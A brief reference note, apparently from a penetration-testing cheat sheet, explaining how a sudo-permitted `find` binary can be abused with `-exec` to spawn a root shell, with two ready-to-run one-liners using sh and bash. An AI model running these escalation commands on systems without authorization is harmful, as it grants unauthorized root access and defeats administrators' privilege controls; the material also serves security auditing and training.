# find to exec

If the `find` binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.
- The `-exec` flag is used with `find` to run some command on each matching file that is found.
- Since the process is running as root (from sudo ), that shell will also be running as root. Instead of `sh`, you can use `bash` as it offers better syntax and it is actually an improvement over `sh`.
```
sudo find . -exec /bin/sh \; -quit
# or
sudo find . -exec /bin/bash \; -quit
```
